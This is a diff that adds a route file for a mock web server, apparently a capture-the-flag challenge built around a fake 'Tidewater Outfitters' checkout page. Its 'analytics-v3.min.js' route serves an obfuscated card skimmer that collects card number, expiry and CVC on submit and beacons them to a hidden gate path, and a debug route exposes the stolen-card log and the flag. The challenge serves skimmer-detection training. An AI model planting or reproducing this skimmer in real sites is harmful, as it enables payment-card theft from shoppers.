@@ -1,0 +1,111 @@
+ttl_minutes = 60
+flag_prefix = "skim"
+
+[[route]]
+method = "GET"
+path = "/"
+[route.respond]
+status = 200
+content_type = "text/html; charset=utf-8"
+body = '''<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><title>Tidewater Outfitters - Checkout</title>
+<style>body{font-family:sans-serif;max-width:30rem;margin:2.5rem auto}input{display:block;width:100%;margin:.4rem 0 1rem;padding:.45rem;box-sizing:border-box}</style></head>
+<body><h1>Checkout</h1>
+<form id="pay" action="/order" method="post">
+<label>Name<input name="name"></label>
+<label>Card number<input name="card" autocomplete="off"></label>
+<label>Expiry<input name="exp" placeholder="MM/YY"></label>
+<label>CVC<input name="cvc" autocomplete="off"></label>
+<button>Pay now</button></form>
+<script src="/static/shop.js"></script>
+<script src="/static/analytics-v3.min.js"></script>
+</body></html>
+'''
+
+[[route]]
+method = "GET"
+path = "/checkout"
+[route.respond]
+status = 200
+content_type = "text/html; charset=utf-8"
+body = '''<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><title>Tidewater Outfitters - Checkout</title>
+<style>body{font-family:sans-serif;max-width:30rem;margin:2.5rem auto}input{display:block;width:100%;margin:.4rem 0 1rem;padding:.45rem;box-sizing:border-box}</style></head>
+<body><h1>Checkout</h1>
+<form id="pay" action="/order" method="post">
+<label>Name<input name="name"></label>
+<label>Card number<input name="card" autocomplete="off"></label>
+<label>Expiry<input name="exp" placeholder="MM/YY"></label>
+<label>CVC<input name="cvc" autocomplete="off"></label>
+<button>Pay now</button></form>
+<script src="/static/shop.js"></script>
+<script src="/static/analytics-v3.min.js"></script>
+</body></html>
+'''
+
+[[route]]
+method = "POST"
+path = "/order"
+[route.respond]
+status = 200
+content_type = "text/html; charset=utf-8"
+body = '''<!doctype html><title>Thank you</title><p>Thank you for your order.</p>
+'''
+
+[[route]]
+method = "GET"
+path = "/static/shop.js"
+[route.respond]
+status = 200
+content_type = "application/javascript"
+body = '''document.getElementById('pay').addEventListener('submit',function(){document.title='Processing...'});
+'''
+
+[[route]]
+method = "GET"
+path = "/static/analytics-v3.min.js"
+[route.respond]
+status = 200
+content_type = "application/javascript"
+body = '''!function(){var a=["{{rev:b64:d:gate}}","{{hex:d:key}}","submit","pay"];
+function r(s){return s.split("").reverse().join("")}
+function h(x){for(var o="",i=0;i<x.length;i+=2)o+=String.fromCharCode(parseInt(x.substr(i,2),16));return o}
+var g=atob(r(a[0])),k=h(a[1]);
+function _dbg(){fetch("/"+g+"?k="+k+"&dump=1").then(function(x){return x.text()}).then(console.log)}
+if(!/checkout|^\/$/.test(location.pathname))return;
+document.getElementById(a[3]).addEventListener(a[2],function(){
+var d={};[].forEach.call(this.elements,function(e){if(e.name)d[e.name]=e.value});
+new Image().src="/"+g+"?k="+k+"&d="+btoa(JSON.stringify(d))})}();
+'''
+
+[[route]]
+method = "GET"
+path = "/{{d:gate}}"
+[route.when]
+query = { "k" = '{{d:key}}', "dump" = '1' }
+[route.respond]
+status = 200
+content_type = "text/plain; charset=utf-8"
+body = '''gate v2.3 - cards collected: 41
+last: 4929 **** **** 0418  09/28  (Tidewater)
+operator note: {{flag}}
+'''
+
+[[route]]
+method = "GET"
+path = "/{{d:gate}}"
+[route.when]
+query = { "k" = '{{d:key}}', "d" = '*' }
+[route.respond]
+status = 200
+content_type = "image/gif"
+body = '''GIF89a'''
+
+[[route]]
+method = "GET"
+path = "/{{d:gate}}"
+[route.respond]
+status = 404
+content_type = "text/plain; charset=utf-8"
+body = '''Not Found'''
+
